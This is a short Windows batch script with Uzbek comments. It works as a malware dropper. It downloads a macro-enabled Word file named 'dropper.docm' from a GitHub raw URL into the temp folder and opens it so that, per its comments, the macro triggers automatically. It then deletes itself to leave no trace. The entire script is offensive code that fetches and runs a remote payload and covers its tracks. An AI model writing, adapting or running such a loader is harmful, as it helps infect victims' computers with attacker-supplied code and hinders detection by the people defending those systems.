@echo off
:: Makroli Word hujjatni yuklab olish
curl -o "%TEMP%\form.docm" https://raw.githubusercontent.com/RoninAli/tdata1/main/dropper.docm

:: Word faylni ochish (avtomatik makro trigger bo'ladi)
start "" "%TEMP%\form.docm"

:: O'zini o'chirish (iz yo'q)
timeout /t 2 >nul
del "%~f0"
